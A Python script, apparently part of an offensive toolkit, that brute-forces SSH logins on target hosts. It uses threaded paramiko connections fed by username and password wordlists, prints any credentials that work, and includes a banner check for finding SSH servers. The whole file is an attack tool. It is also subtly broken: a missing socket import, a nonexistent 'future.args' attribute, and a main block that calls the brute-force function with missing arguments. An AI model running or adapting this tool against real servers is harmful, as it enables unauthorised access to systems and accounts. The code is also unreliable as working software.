import paramiko
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import time

# Base directory for output and wordlists
OUTPUT_DIR = "results/valid_logins/bruteforce_results"
WORDLIST_DIR = "wordlists/ssh"
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(WORDLIST_DIR, exist_ok=True)

# Log file for successful attempts
SUCCESS_LOG = os.path.join(OUTPUT_DIR, "successful_logins.txt")

# File containing valid SSH servers
VALID_SSH_SERVERS_DIR = "results/valid_hosts"

def ssh_connect(host, username, password, port=22, timeout=5):
    """
    Attempt to connect to an SSH server using given credentials.
    """
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port, username, password, timeout=timeout)
        return True
    except paramiko.AuthenticationException:
        return False  # Invalid credentials
    except paramiko.SSHException as e:
        print(f"[ERROR] SSH Exception for {host}: {e}")
        return False
    except Exception as e:
        print(f"[ERROR] Connection to {host} failed: {e}")
        return False
    finally:
        client.close()

def bruteforce_ssh(targets, usernames, passwords, max_threads=10):
    """
    Perform SSH bruteforcing on a list of targets with given usernames and passwords.
    """
    with ThreadPoolExecutor(max_threads) as executor:
        futures = []
        for target in targets:
            for username in usernames:
                for password in passwords:
                    futures.append(
                        executor.submit(ssh_connect, target, username, password)
                    )

        for future in tqdm(as_completed(futures), total=len(futures), desc="Bruteforcing SSH"):
            try:
                if future.result():
                    target, username, password = future.args
                    print(f"[SUCCESS] {target} - {username}:{password}")
            except Exception as e:
                print(f"[ERROR] Error during bruteforcing: {e}")


def load_wordlists():
    """
    Load username and password wordlists from the 'wordlists' directory.

    Returns:
        tuple: Lists of usernames and passwords.
    """
    wordlist_dir = "wordlists"
    username_file = os.path.join(wordlist_dir, "ssh_usernames.txt")
    password_file = os.path.join(wordlist_dir, "ssh_passwords.txt")

    if not os.path.exists(username_file) or not os.path.exists(password_file):
        print("[ERROR] Missing wordlists in the 'wordlists' directory.")
        print("Ensure both 'ssh_usernames.txt' and 'ssh_passwords.txt' exist.")
        return [], []

    with open(username_file, "r") as uf, open(password_file, "r") as pf:
        usernames = [line.strip() for line in uf if line.strip()]
        passwords = [line.strip() for line in pf if line.strip()]

    if not usernames:
        print("[ERROR] The username wordlist is empty.")
        return [], []

    if not passwords:
        print("[ERROR] The password wordlist is empty.")
        return [], []

    print(f"[INFO] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
    return usernames, passwords

def validate_ssh_server(host, port=22, timeout=5):
    """
    Validate if a server is running SSH.
    """
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        banner = sock.recv(1024).decode("utf-8", errors="ignore")
        sock.close()
        return "SSH" in banner
    except Exception as e:
        print(f"[INFO] Skipping {host}: {e}")
        return False


if __name__ == "__main__":
    # Load wordlists and bruteforce valid SSH servers
    usernames, passwords = load_wordlists()
    bruteforce_ssh(usernames, passwords, max_threads=20)

